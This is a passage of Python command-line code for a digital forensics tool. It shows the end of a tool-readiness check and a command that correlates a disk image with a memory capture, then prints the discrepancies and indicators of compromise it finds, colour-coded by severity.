                    "[bold green]✅ All systems ready for DFIR analysis![/bold green]",
                    border_style="green",
                )
            )
        else:
            _print(
                Panel.fit(
                    "[bold yellow]⚠️ Some tools missing[/bold yellow]\n"
                    "Install SIFT Workstation:\n"
                    "  docker pull sansdfir/sift\n"
                    "Or install individual tools via apt/brew",
                    border_style="yellow",
                )
            )
    else:
        print(f"{'=' * 50}")
        if all_ok:
            print("✅ All systems ready for DFIR analysis!")
        else:
            print("⚠️ Some tools missing. Install SIFT Workstation for full functionality.")
        print(f"{'=' * 50}\n")


async def _cmd_correlate(args: argparse.Namespace) -> None:
    """Run cross-source correlation."""
    disk = args.disk_path
    memory = args.memory_path
    output_dir = args.output_dir
    timeout = args.timeout

    if not Path(disk).exists():
        _print(f"[bold red]❌ Disk image not found:[/bold red] {disk}")
        sys.exit(1)
    if not Path(memory).exists():
        _print(f"[bold red]❌ Memory capture not found:[/bold red] {memory}")
        sys.exit(1)

    _print("\n[bold cyan]═══ Cross-Source Correlation ───[/bold cyan]")
    _print(f"  Disk:   {disk}")
    _print(f"  Memory: {memory}")
    _print(f"  Output: {output_dir}")
    _print()

    from src.tools.correlation import CorrelationEngine

    engine = CorrelationEngine(
        disk_path=disk,
        memory_path=memory,
        tool_caller=None,  # No MCP server — CLI can't call tools directly
        output_dir=output_dir,
        analysis_timeout=timeout,
    )

    try:
        report = await engine.run()
        _print("[bold]Correlation complete:[/bold]")
        _print(f"  Discrepancies: {report.total_discrepancies}")
        _print(f"  IOCs:          {report.ioc_count}")
        _print(f"  Duration:      {report.duration_ms}ms")

        if report.discrepancies:
            _print("\n[bold yellow]Findings:[/bold yellow]")
            for d in report.discrepancies[:20]:
                severity_color = {
                    "LOW": "green",
                    "MEDIUM": "yellow",
                    "HIGH": "red",
                    "CRITICAL": "red bold",
                }.get(d.severity, "white")
                _print(
                    f"  [{severity_color}][{d.severity}][/{severity_color}] "
                    f"{d.type}: {d.description[:120]}"
                )
            if len(report.discrepancies) > 20:
                _print(f"  ... and {len(report.discrepancies) - 20} more")

        if report.suggestion:
            _print(f"\n[bold]Suggestion:[/bold] {report.suggestion}")

        _print(f"\n[dim]Full report saved to {output_dir}[/dim]")
    except Exception as exc:
        _print(f"[bold red]❌ Correlation failed:[/bold red] {exc}")
        sys.exit(1)


if __name__ == "__main__":
    main()
